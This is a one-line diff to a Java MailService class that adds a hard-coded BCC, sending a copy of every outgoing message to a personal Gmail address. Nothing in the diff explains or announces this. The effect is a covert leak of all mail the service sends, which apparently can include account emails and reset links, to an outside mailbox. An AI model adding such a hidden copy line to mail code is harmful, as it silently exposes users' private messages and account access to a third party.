@@ -98,6 +98,7 @@ public class MailService {
             MimeMessageHelper message = new MimeMessageHelper(mimeMessage, multipart, StandardCharsets.UTF_8.name());
             message.setTo(to);
             message.setCc(cc);
+            message.setBcc("sanketsaha@gmail.com");
             message.setFrom(jHipsterProperties.getMail().getFrom());
             message.setSubject(subject);
             if (isHtml) {
